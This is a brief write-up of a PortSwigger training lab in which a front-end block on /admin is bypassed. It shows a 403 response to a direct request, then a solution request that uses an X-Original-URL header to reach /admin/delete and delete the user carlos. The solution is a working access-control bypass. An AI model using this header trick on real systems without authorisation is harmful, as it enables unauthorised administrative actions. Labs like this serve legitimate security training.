# [Lab: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

This website has an unauthenticated admin panel at  `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the  `X-Original-URL`  header.

To solve the lab, access the admin panel and delete the user  `carlos`.

## Analysis

request:

```http
GET /admin HTTP/1.1
```

- response:

  ```http
  HTTP/1.1 403 Forbidden
  Content-Type: application/json; charset=utf-8
  Connection: close
  Content-Length: 15

  "Access denied"
  ```

## Solution

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```
